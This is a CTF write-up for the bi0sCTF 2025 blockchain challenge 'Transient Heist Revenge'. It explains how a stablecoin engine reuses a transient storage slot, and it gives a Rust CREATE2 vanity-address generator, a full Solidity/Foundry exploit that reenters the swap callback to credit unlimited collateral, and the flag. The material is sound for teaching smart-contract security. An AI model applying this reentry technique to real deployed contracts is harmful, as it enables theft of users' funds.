---
title: "Transient Heist Revenge - bi0sCTF 2025"
date: 2025-06-21T15:00:00+00:00
description: "NA"
tags: ["Transient Storage Exploitation","Swap callback exploitation"]
categories: ["writeups","Challenges","web3 security"]
author: "s4bot3ur"
showToc: true
TocOpen: true
draft: false
---
Writeup for a blockchain CTF challenge.

**tl;dr**


- The challenge revolves around **transient storage confusion**.
- `USDSEngine` uses the same transient slot for both swap pair address validation and later for storing the **excess amount** returned to the user.
- After `bi0sSwapv1Call`, the slot gets overwritten with amount added into user vault.
- Deploy a vanity contract at an address equal to this vault amount using `CREATE2`.
- Reenter `bi0sSwapv1Call` through the malicious contract to deposit collateral without actually providing any.

<!--more-->


**Challenge Points:** 980                   
**No. of solves:** 7    
**Challenge Author:** [s4bot3ur](https://x.com/s4bot3ur)     

## Challenge Description
NA

## Introduction

This challenge revolves around two core contracts: `Setup.sol` and `USDSEngine.sol`. The `USDSEngine` contract serves as the minting and burning engine for the `USDS` stablecoin. Users can deposit approved collateral into the `USDSEngine` and mint `USDS` tokens in return.

The objective of the challenge is to exploit a vulnerability in the `USDSEngine` contract and deposit an **unlimited amount of collateral** in a way that causes the `Setup::isSolved()` function to return true. This function returns true if the collateral deposited by the player into the `USDSEngine` is greater than `uint256(keccak256("YOU NEED SOME BUCKS TO GET FLAG"))`.

>**Note:** In this challenge you will start with **80,001 ether**.

## Key Concepts To Learn
Inorder to solve this challenge you need to understand how transient storage works.

I’ve explained transient storage in detail in the [Transient Heist](https://blog.bi0s.in/2025/06/13/Pentest/TransientHeist-bi0sCTF2025/) challenge. If you’re unfamiliar with it, I highly recommend reading that blog post first.

## Understanding the Vulnerability

The vulnerability lies in the following two functions of the `USDSEngine` contract:

```javascript
    function depositCollateralThroughSwap(address _otherToken,address _collateralToken,uint256 swapAmount,uint256 _collateralDepositAmount)public 
            acceptedToken(_collateralToken)returns (uint256 tokensSentToUserVault)
    {
        IERC20(_otherToken).transferFrom(msg.sender, address(this), swapAmount);
        IBi0sSwapPair bi0sSwapPair=IBi0sSwapPair(bi0sSwapFactory.getPair(_otherToken, _collateralToken));
        assembly{
            tstore(1,bi0sSwapPair)
        }
        bytes memory data=abi.encode(_collateralDepositAmount);
        IERC20(_otherToken).approve(address(bi0sSwapPair), swapAmount);
        bi0sSwapPair.swap(_otherToken, swapAmount, address(this),data);
        assembly{
            tokensSentToUserVault:=tload(1)
        }
    }

    function bi0sSwapv1Call(address sender,address collateralToken,uint256 amountOut,bytes memory data) external nonReEntrant {
        uint256 collateralDepositAmount=abi.decode(data,(uint256));
        address bi0sSwapPair;
        assembly{
            bi0sSwapPair:=tload(1)
        }
        if(msg.sender!=bi0sSwapPair){
            revert USDSEngine__Only__bi0sSwapPair__Can__Call();
        }
        if(collateralDepositAmount>amountOut){
            revert USDSEngine__Insufficient__Collateral();
        }
        uint256 tokensSentToUserVault=amountOut-collateralDepositAmount;
        user_vault[sender][collateralToken]+=tokensSentToUserVault;
        assembly{
            tstore(1,tokensSentToUserVault)
        }
        collateralDeposited[sender][collateralToken]+=collateralDepositAmount;
    }
```

The vulnerability lies in the `depositCollateralThroughSwap` and `bi0sSwapv1Call` functions of the `USDSEngine` contract. The `USDSEngine::depositCollateralThroughSwap` is designed to allow users to deposit collateral tokens like WETH or SafeMoon by first swapping other tokens via a swap pair, all within a single transaction. The idea is that if a user provides a non-collateral token, the contract will swap it for a supported collateral token and deposit that into the system on behalf of the user. If the amount received from the swap is greater than the intended collateral deposit, the extra tokens are credited to the user's vault and returned as the function's return value.

The issue here is that the contract uses **transient storage** (via `tstore` and `tload`) to temporarily store and retrieve data within a transaction. In `USDSEngine::depositCollateralThroughSwap`, the contract stores the address of the `swap pair` in **transient slot 1**, which is later read inside `USDSEngine::bi0sSwapv1Call` to verify that the callback is coming from the expected contract. However, later in the same callback, the contract overwrites this **transient slot** with the amount of tokens credited to the user's vault, so it can return this value to the caller. The problem is that the contract does not clear the **transient slot** before returning. This means that if we can control the return value and make it equal to the address of our malicious contract, we can reenter `USDSEngine::bi0sSwapv1Call` again and again, bypassing the intended validation.

## The Exploit

We start the challenge with **80,001 ETH**, but since the exploit involves Wrapped Ether (WETH), the first step is to wrap our ETH into WETH.

The `USDSEngine` contract only accepts WETH and SafeMoon as valid collateral tokens. To deposit collateral, we must swap another token for either of these. According to the NatSpec, `1 SafeMoon = 0.0000000000001657 USDS` and `1 WETH = 2500 USDS`, meaning SafeMoon is significantly cheaper than USDS. So, if we swap a large amount of WETH (e.g., 80,000 ETH) for SafeMoon, the `amountOut` will be very large.

However, the challenge is crafted so that even after swapping 80,000 ETH, the SafeMoon amountOut isn’t large enough to match the full 20-byte (160-bit) value of an Ethereum address. It only covers about 16.5 bytes (i.e 7 leading zeros). That means we need to deploy our malicious contract at a vanity address with just 7 leading zero, But even within the 7 leading zeros if our vanity address is greater than `amountOut` then exploit won't work. For example, if:
```javascript
amountOut      = 0x000000019f3c81b6d247fe39c0ae154bf27d4380
vanity address = 0x000000029f3c81b6d247fe39c0ae154bf27d4380
```
This address is greater than the `amountOut`, so the exploit will fail. 

But if we deploy our contract with 8 leading zeros then we can surely say that the vanity address will be less than `amountOut`.
```javascript
amountOut      = 0x000000019f3c81b6d247fe39c0ae154bf27d4380
vanity address = 0x00000000bccd92f040c619256ee16ac627246a77
```
This address is numerically smaller than the amountOut, which is crucial. In the `bi0sSwapv1Call` function, the contract stores `amountOut - collateralDepositAmount` into **transient storage slot 1**. So if we pass a collateralDepositAmount equal to `amountOut - vanityAddress` then transient storage will end up holding:
```javascript
amountOut - (amountOut - vanityAddress) = vanityAddress
```

This effectively writes our contract’s address into **transient slot 1**. Since the contract never clears this slot, we can repeatedly re-enter `bi0sSwapv1Call`, bypassing the swap pair check every time and depositing **infinie collateral**.

Below are the exploit scripts.

### Create2 Vanity Generator


```rust
use rayon::prelude::*;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tiny_keccak::{Hasher, Keccak};
use rand::Rng;
use hex::encode;
use hex_literal::hex;
use std::fs::OpenOptions;
use std::io::Write;

const TARGET_PREFIX: &[u8] = &[0x00,0x00,0x00,0x00]; 
const DEPLOYER: [u8; 20] = hex!("Dc64a140Aa3E981100a9becA4E685f962f0cF6C9");

fn keccak256(input: &[u8]) -> [u8; 32] {
    let mut output = [0u8; 32];
    let mut hasher = Keccak::v256();
    hasher.update(input);
    hasher.finalize(&mut output);
    output
}

fn create2_address(salt: &[u8; 32], deployer: &[u8; 20], init_code_hash: &[u8; 32]) -> [u8; 20] {
    let mut data = Vec::with_capacity(1 + 20 + 32 + 32);
    data.push(0xff);
    data.extend_from_slice(deployer);
    data.extend_from_slice(salt);
    data.extend_from_slice(init_code_hash);
    let hash = keccak256(&data);
    hash[12..32].try_into().unwrap()
}

fn main() {
    let init_code_hash: [u8; 32] = hex!("c7106b83393dde32127292c8aa245a425563699b1a8ab3ce78f2f2c93e30fb3b");
    let found = Arc::new(AtomicBool::new(false));
    loop {
        if found.load(Ordering::Relaxed) {
            break;
        }
        (0..100_000u64).into_par_iter().for_each_with(found.clone(), |found, _| {
            if found.load(Ordering::Relaxed) {
                return;
            }

            let salt: [u8; 32] = rand::thread_rng().gen();
            let addr = create2_address(&salt, &DEPLOYER, &init_code_hash);

            if addr.starts_with(TARGET_PREFIX) {
                if !found.swap(true, Ordering::SeqCst) {

                    let mut file = OpenOptions::new()
                        .create(true)
                        .write(true)
                        .truncate(true)
                        .open(".env")
                        .expect("Failed to create .env file");
                    writeln!(file, "SALT=0x{}", encode(salt)).expect("Failed to write to file");
                    std::process::exit(0);
                }
            }
        });
    }
}
```

### Exploit Script

```javascript
pragma solidity ^0.8.0;


import {Script,console} from "forge-std/Script.sol";
import {USDS,USDC,WETH,SafeMoon,Setup,USDSEngine} from "src/core/Setup.sol";

import {IBi0sSwapFactory} from "src/bi0s-swap-v1/interfaces/IBi0sSwapFactory.sol";
import {IBi0sSwapPair} from "src/bi0s-swap-v1/interfaces/IBi0sSwapPair.sol";
import "forge-std/StdJson.sol";
contract Solve is Script{
    using stdJson for *;

    function run()public{
        string memory path = string.concat("broadcast/Deploy.s.sol/", vm.toString(block.chainid), "/run-latest.json");
        string memory json = vm.readFile(path);
        address setupAddress = json.readAddress(".transactions[0].contractAddress");
        vm.startBroadcast();
        bytes32 salt=vm.envBytes32("SALT");
        Setup setup=Setup(address(setupAddress));
        WETH weth=setup.weth();
        Create2Deployer create2deployer=new Create2Deployer();
        console.log("CREATE 2:",address(create2deployer));
        console.logBytes32(create2deployer.getInitHash());
        address exploit=create2deployer.deploy(salt);
        console.log(exploit);
        Exploit(exploit).initialize(address(setup));
        Exploit(exploit).pwn{value:80000000000000000000000}();
        vm.stopBroadcast();
    }
}


contract Exploit{

    Setup public setup;
    USDSEngine usdcEngine;
    IBi0sSwapPair wethSafeMoonPair;
    WETH weth;
    SafeMoon safemoon;
    uint256 requiredAmount=uint256(bytes32(keccak256("YOU NEED SOME BUCKS TO GET FLAG")))+1;

    function initialize(address _setup)public{
        setup=Setup(_setup);
        usdcEngine=setup.usdsEngine();
        wethSafeMoonPair=setup.wethSafeMoonPair();
        weth=setup.weth();
        safemoon=setup.safeMoon();
    }

    function pwn()public payable returns (bool){
        uint256 this_addr=uint256(uint160(address(this)));
        address player=address(10);
        weth.deposit{value:80000e18}(address(this));
        weth.approve(address(usdcEngine), 80000e18);
        uint256 _collateralDepositAmount=1207000603499873710129495113646411976443-uint256(uint160(address(this)));
        usdcEngine.depositCollateralThroughSwap(address(weth), address(safemoon), 80000e18, _collateralDepositAmount);
        usdcEngine.bi0sSwapv1Call(player, address(weth), requiredAmount+this_addr, abi.encode(requiredAmount));
        usdcEngine.bi0sSwapv1Call(player, address(safemoon), requiredAmount+this_addr, abi.encode(requiredAmount));
        setup.setPlayer(player);
        require(setup.isSolved(),"Chall Unsolved");
    }

}


contract Create2Deployer {


    function deploy( bytes32 _salt) public returns (address) {
        bytes memory initcode=type(Exploit).creationCode;
        address addr;
        assembly {
            addr := create2(0, add(initcode, 0x20), mload(initcode), _salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    function getInitHash()public returns (bytes32){
        bytes memory initcode=type(Exploit).creationCode;
        return keccak256(initcode);
    }
}

```

Another way to create a vanity address is by using [profanity-2](https://github.com/1inch/profanity2). This tool will generate an EOA such that when a contract is deployed from it at nonce 0, the resulting contract address has the desired number of leading zeros.

Thanks to [Kaiziron](https://x.com/Kaiziron) for sharing this approach.
## Conclusion
This bug stems from unsafe reuse of transient storage without clearing it. By carefully crafting the return value, we can reenter the contract and repeatedly bypass the expected checks, ultimately minting an unlimited amount of USDS stablecoins.

**FLAG:**`bi0sctf{tx:0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f:v2}`     

This challenge is inspired by the [SIR Trading Hack](https://etherscan.io/tx/0xa05f047ddfdad9126624c4496b5d4a59f961ee7c091e7b4e38cee86f1335736f).

The local setup for this challenge is available in the following two repositories:
1. [bi0s](https://github.com/teambi0s/bi0sCTF/blob/main/2025/BLOCKCHAIN/Transient-Heist-Revenge): This is the exact setup used during the CTF.
2. [s4bot3ur](https://github.com/s4bot3ur/ctf-by-s4bot3ur/tree/main/bi0s-ctf-2025/Transient-Heist-Revenge): This is a simpler setup for solving the challenge locally.